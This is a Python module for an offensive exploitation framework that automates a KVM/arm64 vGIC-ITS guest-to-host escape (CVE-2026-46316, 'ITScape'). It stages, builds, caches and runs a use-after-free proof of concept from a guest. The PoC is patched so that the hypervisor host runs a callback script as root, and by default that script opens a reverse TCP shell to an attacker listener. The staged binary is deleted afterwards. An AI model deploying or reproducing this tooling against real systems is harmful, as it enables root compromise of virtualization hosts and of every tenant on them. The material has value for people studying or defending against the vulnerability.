#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""KVM/arm64 vGIC-ITS guest-to-host escape (CVE-2026-46316 / ITScape)."""

from __future__ import annotations

import os
import shlex
import time
from pathlib import Path

from kittysploit import *
from lib.exploit.handler import Reverse
from lib.post.linux.kvm_host_session import (
    ITSCAPE_CALLBACK,
    PAYLOAD_MARKER,
    PAYLOAD_REVERSE_SHELL,
    callback_lhost,
    callback_lport,
    callback_script_body,
    itscape_host_command,
    patch_itscape_source,
    payload_mode,
    snapshot_session_ids,
    stage_callback_script,
    wait_for_new_sessions,
)
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin

_SELFTEST_TEST = "vgic_lpi_stress"
_SELFTEST_C = f"{_SELFTEST_TEST}.c"


class Module(Post, Reverse, System, LinuxSessionMixin):
    __info__ = {
        "name": "KVM ARM64 vGIC-ITS Guest Escape (CVE-2026-46316)",
        "description": (
            "Runs the ITScape PoC (vgic_its_invalidate_cache double-put UAF) on a KVM/arm64 "
            "hypervisor host via /dev/kvm. Default payload starts a reverse TCP shell as root "
            "on the host (new KittySploit session). Marker-only mode creates /ITScape for lab "
            "verification."
        ),
        "author": ["Hyunwoo Kim (@v4bel)", "KittySploit Team"],
        "cve": ["CVE-2026-46316"],
        "platform": [Platform.LINUX],
        "arch": [Arch.ARM64],
        "session_type": [SessionType.SHELL, SessionType.SSH],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-46316",
        ],
        "tags": ["kvm", "arm64", "vgic", "guest-escape", "manage"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 2.5,
            "noise": 0.9,
            "value": 0.9,
            "requires": {
                "capabilities_any": ["shell"],
                "capabilities_all": [],
            },
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["shell"],
                "option_bindings": {"payload": PAYLOAD_REVERSE_SHELL},
                "suggested_followups": [],
            },
        },
    }

    remote_bin = OptString(
        "/tmp/.ks_kvm46316/poc",
        "Remote path for the compiled PoC binary",
        required=True,
    )
    kernel_src = OptString(
        "",
        "Linux kernel source tree on target (tools/testing/selftests/kvm build)",
        required=False,
    )
    success_path = OptString("/ITScape", "Host file created on successful escape", required=False)
    payload = OptChoice(
        PAYLOAD_REVERSE_SHELL,
        "Host payload: reverse_shell opens root callback session; marker only touches success_path",
        required=False,
        choices=[PAYLOAD_REVERSE_SHELL, PAYLOAD_MARKER],
    )
    callback_host = OptString(
        "",
        "IP/host the KVM host can reach for reverse shell (default: lhost)",
        required=False,
    )
    wait_seconds = OptInteger(
        20,
        "Seconds to wait for host reverse-shell callback after PoC trigger",
        required=False,
    )
    vcpus = OptInteger(4, "PoC -v vCPU count (max ~7 with fixed 2nd ITS GPA)", required=False)
    devices = OptInteger(128, "PoC -d device count", required=False)
    events = OptInteger(1024, "PoC -e events per device", required=False)
    gsync = OptInteger(0, "PoC -g extra GUEST_SYNC drain per WWW sweep", required=False)
    use_remote_cache = OptBool(True, "Reuse cached binary on target for this kernel release", required=False)
    clear_cache = OptBool(False, "Delete remote cache for this kernel before run", required=False)
    cleanup = OptBool(True, "Remove staged run-path binary after execution", required=False)
    timeout = OptInteger(200, "PoC execution timeout in seconds", required=False)
    confirm = OptBool(False, "Confirm intentional guest-to-host escape attempt", required=True)

    @staticmethod
    def _repo_root() -> Path:
        return Path(__file__).resolve().parents[5]

    def _exploit_dir(self) -> Path:
        return self._repo_root() / "data" / "exploits" / "CVE-2026-46316"

    @staticmethod
    def _as_bool(value) -> bool:
        if isinstance(value, bool):
            return value
        return str(value).strip().lower() in ("1", "true", "yes", "y", "on")

    def _opt_int(self, val, default: int, minimum: int | None = None) -> int:
        return self.linux_int_opt(val, default, minimum)

    def _payload_mode(self) -> str:
        return payload_mode(getattr(self.payload, "value", self.payload))

    def _prepare_poc_source(self, success: str) -> str:
        lhost = callback_lhost(self, str(self.callback_host or "").strip())
        lport = callback_lport(self)
        if not lhost:
            raise ValueError("lhost or callback_host is required for reverse_shell payload")
        body = callback_script_body(lhost, lport, success)
        if not stage_callback_script(self, ITSCAPE_CALLBACK, body):
            raise RuntimeError(f"Could not stage host callback script at {ITSCAPE_CALLBACK}")
        print_status(
            f"Staged host callback script ({ITSCAPE_CALLBACK}) -> {lhost}:{lport} as root via UMH."
        )
        raw = (self._exploit_dir() / "poc.c").read_text(encoding="utf-8")
        return patch_itscape_source(raw, itscape_host_command())

    def _target_kernel_release(self) -> str:
        return (self.linux_execute("uname -r 2>/dev/null", pty=False) or "").strip()

    def _cache_root(self, remote_bin: str) -> str:
        base = os.path.dirname(remote_bin) or "/tmp/.ks_kvm46316"
        return f"{base.rstrip('/')}/cache"

    def _cache_bin_path(self, remote_bin: str, kver: str) -> str:
        safe = kver.replace("/", "_")
        return f"{self._cache_root(remote_bin)}/{safe}/poc"

    def _prebuilt_local(self, kver: str) -> Path | None:
        root = self._exploit_dir() / "prebuilt"
        for candidate in (root / kver / "poc", root / "aarch64" / "poc"):
            if candidate.is_file():
                return candidate
        return None

    def _remote_cache_valid(self, cache_bin: str, kver: str) -> bool:
        qbin = shlex.quote(cache_bin)
        qkver = shlex.quote(kver)
        qstamp = shlex.quote(f"{cache_bin}.kver")
        out = self.linux_execute(
            f"test -s {qbin} && test -x {qbin} && test -f {qstamp} && "
            f"[ \"$(cat {qstamp} 2>/dev/null)\" = {qkver} ] && echo OK || echo MISS",
            pty=False,
        )
        return "OK" in (out or "")

    def _stamp_remote_cache(self, cache_bin: str, kver: str) -> None:
        qstamp = shlex.quote(f"{cache_bin}.kver")
        qkver = shlex.quote(kver)
        self.linux_execute(f"printf '%s' {qkver} > {qstamp}", pty=False)

    def _save_to_remote_cache(
        self,
        cache_bin: str,
        kver: str,
        *,
        data: bytes | None = None,
        src_bin: str | None = None,
    ) -> bool:
        qdir = self.linux_shell_quote(os.path.dirname(cache_bin))
        self.linux_execute(f"mkdir -p {qdir}", pty=False)
        if data is not None:
            if not self.linux_upload_bytes(data, cache_bin, executable=True, pty=False):
                return False
        elif src_bin:
            qsrc = shlex.quote(src_bin)
            qdst = shlex.quote(cache_bin)
            self.linux_execute(f"cp -f {qsrc} {qdst} && chmod +x {qdst}", pty=False)
            if not self.linux_file_exists(cache_bin):
                return False
        else:
            return False
        self._stamp_remote_cache(cache_bin, kver)
        print_success(
            f"Cached PoC on target ({self.linux_remote_file_size(cache_bin)} bytes, kver={kver})."
        )
        return True

    def _copy_remote_bin(self, src: str, dst: str) -> bool:
        if os.path.normpath(src) == os.path.normpath(dst):
            return self.linux_file_exists(src)
        qsrc = shlex.quote(src)
        qdst = shlex.quote(dst)
        qd = self.linux_shell_quote(os.path.dirname(dst) or ".")
        self.linux_execute(f"mkdir -p {qd}", pty=False)
        self.linux_execute(f"cp -f {qsrc} {qdst} && chmod +x {qdst}", pty=False)
        return self.linux_file_exists(dst)

    def _clear_remote_cache(self, remote_bin: str, kver: str) -> None:
        cache_bin = self._cache_bin_path(remote_bin, kver)
        qdir = shlex.quote(os.path.dirname(cache_bin))
        self.linux_execute(f"rm -rf {qdir}", pty=False)
        print_status(f"Remote cache cleared for kernel {kver}.")

    def _selftest_dir(self, kernel_src: str) -> str:
        return f"{kernel_src.rstrip('/')}/tools/testing/selftests/kvm"

    def _build_via_selftests(
        self,
        remote_work: str,
        kernel_src: str,
        *,
        poc_bytes: bytes | None = None,
    ) -> str | None:
        poc_local = self._exploit_dir() / "poc.c"
        if poc_bytes is None and not poc_local.is_file():
            print_error(f"Missing bundled source: {poc_local}")
            return None

        st = self._selftest_dir(kernel_src)
        qst = shlex.quote(st)
        qwork = shlex.quote(remote_work)
        qbackup = shlex.quote(f"{remote_work}/.vgic_lpi_stress.c.bak")

        out = self.linux_execute(
            f"test -d {qst}/lib && test -f {qst}/{_SELFTEST_C} && echo OK || echo MISSING",
            pty=False,
        )
        if "OK" not in (out or ""):
            print_error(
                f"KVM selftests not found under {st} (need full kernel tree with "
                f"tools/testing/selftests/kvm/{_SELFTEST_C})."
            )
            return None

        self.linux_execute(f"mkdir -p {qwork}", pty=False)
        remote_poc = f"{remote_work.rstrip('/')}/poc.c"
        upload = poc_bytes if poc_bytes is not None else poc_local.read_bytes()
        print_status(f"Uploading poc.c ({len(upload)} bytes)...")
        if not self.linux_upload_bytes(upload, remote_poc, pty=False):
            return None

        built = f"{remote_work.rstrip('/')}/{_SELFTEST_TEST}"
        qbuilt = shlex.quote(built)
        qpoc = shlex.quote(remote_poc)
        qorig = shlex.quote(f"{st}/{_SELFTEST_C}")
        qswap = shlex.quote(f"{st}/.{_SELFTEST_C}.ks_swap")

        print_status(f"Building via KVM selftests (make {_SELFTEST_TEST})...")
        script = (
            f"set -e; "
            f"cp -f {qorig} {qbackup}; "
            f"cp -f {qpoc} {qorig}; "
            f"cd {qst} && make {_SELFTEST_TEST} 2>&1; "
            f"rc=$?; "
            f"if [ -x {qst}/{_SELFTEST_TEST} ]; then "
            f"  cp -f {qst}/{_SELFTEST_TEST} {qbuilt}; "
            f"elif [ -x {qst}/../kselftest/{_SELFTEST_TEST} ]; then "
            f"  cp -f {qst}/../kselftest/{_SELFTEST_TEST} {qbuilt}; "
            f"else "
            f"  found=$(find {qst} -maxdepth 3 -name {_SELFTEST_TEST} -type f -executable 2>/dev/null | head -n1); "
            f"  test -n \"$found\" && cp -f \"$found\" {qbuilt}; "
            f"fi; "
            f"mv -f {qbackup} {qorig}; "
            f"test -x {qbuilt} || exit $rc; "
            f"echo BUILD_OK"
        )
        out = self.linux_execute(script, timeout=600, pty=False)
        if out:
            print_info(out)
        if not self.linux_file_exists(built):
            print_error(f"Selftest build failed — {_SELFTEST_TEST} binary not found.")
            return None
        print_success(f"Built {_SELFTEST_TEST} ({self.linux_remote_file_size(built)} bytes).")
        return built

    def _resolve_prebuilt_bytes(self, kver: str, *, load: bool) -> tuple[bytes | None, str]:
        path = self._prebuilt_local(kver)
        if path:
            if load:
                data = path.read_bytes()
                print_success(f"Using framework prebuilt ({len(data)} bytes, {path.name}).")
                return data, "prebuilt"
            return None, "prebuilt"
        return None, "remote"

    def _ensure_poc_bin(
        self,
        remote_bin: str,
        kver: str,
        *,
        poc_source: str | None = None,
    ) -> tuple[bool, str]:
        cache_bin = self._cache_bin_path(remote_bin, kver)
        remote_work = os.path.dirname(remote_bin) or "/tmp/.ks_kvm46316"
        use_cache = poc_source is None and self._payload_mode() == PAYLOAD_MARKER
        poc_bytes = poc_source.encode("utf-8") if poc_source is not None else None

        if self._as_bool(self.clear_cache):
            self._clear_remote_cache(remote_bin, kver)

        if use_cache and self._as_bool(self.use_remote_cache) and self._remote_cache_valid(cache_bin, kver):
            print_success(
                f"Remote cache hit ({self.linux_remote_file_size(cache_bin)} bytes, kver={kver})."
            )
            if self._copy_remote_bin(cache_bin, remote_bin):
                return True, "remote_cache"
            print_warning("Remote cache copy failed; rebuilding.")

        if use_cache:
            prebuilt, mode = self._resolve_prebuilt_bytes(kver, load=True)
            if prebuilt is not None:
                if self._save_to_remote_cache(cache_bin, kver, data=prebuilt):
                    if self._copy_remote_bin(cache_bin, remote_bin):
                        return True, mode
                if self.linux_upload_bytes(prebuilt, remote_bin, executable=True, pty=False):
                    return True, mode
                return False, mode

        kernel_src = str(self.kernel_src or "").strip()
        if not kernel_src:
            print_error(
                "No prebuilt binary and KERNEL_SRC not set. Either add "
                f"data/exploits/CVE-2026-46316/prebuilt/{kver}/poc (or prebuilt/aarch64/poc), "
                "or set KERNEL_SRC to a full Linux tree on the target."
            )
            return False, "remote"

        built = self._build_via_selftests(remote_work, kernel_src, poc_bytes=poc_bytes)
        if not built:
            return False, "selftest"
        if use_cache and not self._save_to_remote_cache(cache_bin, kver, src_bin=built):
            print_warning("Build succeeded but cache write failed.")
        if not self._copy_remote_bin(built, remote_bin):
            return False, "selftest"
        return True, "selftest"

    def _poc_argv(self) -> str:
        return " ".join(
            [
                shlex.quote(f"-v{self._opt_int(self.vcpus, 4, minimum=2)}"),
                shlex.quote(f"-d{self._opt_int(self.devices, 128, minimum=1)}"),
                shlex.quote(f"-e{self._opt_int(self.events, 1024, minimum=1)}"),
                shlex.quote(f"-g{self._opt_int(self.gsync, 0, minimum=0)}"),
            ]
        )

    def _has_kvm_access(self) -> bool:
        out = self.linux_execute(
            "test -c /dev/kvm && (test -r /dev/kvm && test -w /dev/kvm) && echo OK || echo NO",
            pty=False,
        )
        return "OK" in (out or "")

    def check(self):
        if not self.linux_require_linux():
            return False
        if not self._as_bool(self.confirm):
            print_error("Refusing guest escape without confirm=true")
            return False

        arch = (self.linux_execute("uname -m 2>/dev/null", pty=False) or "").strip().lower()
        if arch not in ("aarch64", "arm64"):
            print_error(f"Architecture {arch or 'unknown'} is not supported (need arm64/aarch64).")
            return False

        if not (self._exploit_dir() / "poc.c").is_file():
            print_error(f"Missing bundled source: {self._exploit_dir() / 'poc.c'}")
            return False

        kver = self._target_kernel_release()
        if not kver:
            print_error("Could not read target kernel release (uname -r).")
            return False

        if not self._has_kvm_access():
            print_error("/dev/kvm is missing or not readable/writable for this session.")
            return False

        if self._payload_mode() == PAYLOAD_REVERSE_SHELL:
            lhost = callback_lhost(self, str(self.callback_host or "").strip())
            if not lhost:
                print_error(
                    "reverse_shell payload requires lhost (or callback_host) reachable from the KVM host."
                )
                return False
            kernel_src = str(self.kernel_src or "").strip()
            if not kernel_src:
                print_error(
                    "reverse_shell payload requires KERNEL_SRC on the target for a patched selftest build."
                )
                return False
            st = self._selftest_dir(kernel_src)
            qst = shlex.quote(st)
            out = self.linux_execute(
                f"test -d {qst}/lib && test -f {qst}/{_SELFTEST_C} && echo OK || echo MISSING",
                pty=False,
            )
            if "OK" not in (out or ""):
                print_error(
                    f"KERNEL_SRC selftests missing under {st} "
                    f"(need tools/testing/selftests/kvm/{_SELFTEST_C})."
                )
                return False
            print_status(
                f"Host callback target {lhost}:{callback_lport(self)} — listener starts at run time."
            )
            print_status(
                "Patched PoC will be rebuilt via KVM selftests for reverse_shell "
                "(prebuilt and remote cache are skipped)."
            )
        else:
            _, prebuilt_mode = self._resolve_prebuilt_bytes(kver, load=False)
            cache_ok = False
            if self._as_bool(self.use_remote_cache):
                cache_bin = self._cache_bin_path(
                    str(self.remote_bin).strip() or "/tmp/.ks_kvm46316/poc", kver
                )
                cache_ok = self._remote_cache_valid(cache_bin, kver)

            kernel_src = str(self.kernel_src or "").strip()
            if prebuilt_mode != "prebuilt" and not cache_ok and not kernel_src:
                print_warning(
                    "No framework prebuilt or remote cache — set KERNEL_SRC for on-target selftest build."
                )

        print_warning(
            "CVE-2026-46316 targets Linux v7.1-rc6 arm64 with hardcoded kernel addresses. "
            "Other builds need address re-derivation in poc.c."
        )
        if self._payload_mode() == PAYLOAD_MARKER:
            print_status(
                "Guest-to-host escape — success creates "
                f"{str(self.success_path).strip() or '/ITScape'} as root (marker mode)."
            )
        return True

    def run(self):
        if not self.check():
            return False

        kver = self._target_kernel_release()
        remote_bin = str(self.remote_bin).strip() or "/tmp/.ks_kvm46316/poc"
        success = str(self.success_path).strip() or "/ITScape"
        qsuccess = shlex.quote(success)
        mode = self._payload_mode()
        before_sessions: set[str] = set()
        poc_source: str | None = None

        if mode == PAYLOAD_REVERSE_SHELL:
            before_sessions = snapshot_session_ids(self.framework)
            if not self.start_handler():
                print_error("Could not start reverse TCP listener for host callback.")
                return False
            time.sleep(1.0)
            try:
                poc_source = self._prepare_poc_source(success)
            except (ValueError, RuntimeError) as exc:
                print_error(str(exc))
                self.stop_handler()
                return False

        ok, source = self._ensure_poc_bin(remote_bin, kver, poc_source=poc_source)
        if not ok:
            if mode == PAYLOAD_REVERSE_SHELL:
                self.stop_handler()
            return False
        if source != "remote_cache":
            print_status(f"PoC staged from {source}.")

        argv = self._poc_argv()
        qbin = shlex.quote(remote_bin)
        cmd = f"{qbin} {argv}".strip()
        run_timeout = max(60, self._opt_int(self.timeout, 200, minimum=60))

        print_warning(f"Running ITScape PoC (timeout={run_timeout}s): {cmd}")
        if mode == PAYLOAD_REVERSE_SHELL:
            print_status(
                "UMH will run staged callback as root on the host; watch for a new shell session."
            )
        else:
            print_status("PoC forks — parent polls for host-side success marker...")

        out = self.linux_execute(cmd, timeout=run_timeout, pty=False)
        if out:
            print_info(out)

        success_flag = False
        if mode == PAYLOAD_REVERSE_SHELL:
            wait_s = max(5, self._opt_int(self.wait_seconds, 20, minimum=5))
            new_sessions = wait_for_new_sessions(self.framework, before_sessions, wait_s)
            if new_sessions:
                print_success(
                    f"Host root callback session(s): {', '.join(new_sessions)} — use 'sessions' to interact."
                )
                success_flag = True
            else:
                print_warning(
                    f"No callback within {wait_s}s. Ensure {callback_lhost(self, str(self.callback_host or '').strip())}:"
                    f"{callback_lport(self)} is reachable from the KVM host."
                )

        marker = self.linux_execute(f"test -f {qsuccess} && ls -la {qsuccess} || echo MISSING", pty=False)
        if marker and "MISSING" not in marker:
            print_success(f"Host escape indicator present: {success}")
            print_info(marker.strip())
            success_flag = True
        elif out and ("[+] /ITScape created" in out or "[+] /ITScape" in out):
            print_success("PoC reported successful host-side file creation.")
            success_flag = True
        elif mode == PAYLOAD_MARKER and not success_flag:
            print_warning(
                f"Success marker {success!r} not found. Heap spray / cross-cache is probabilistic — retry."
            )

        if self._as_bool(self.cleanup):
            self.linux_execute(f"rm -f {qbin}", pty=False)
            print_status("Staged run-path binary removed (remote cache preserved).")

        return success_flag
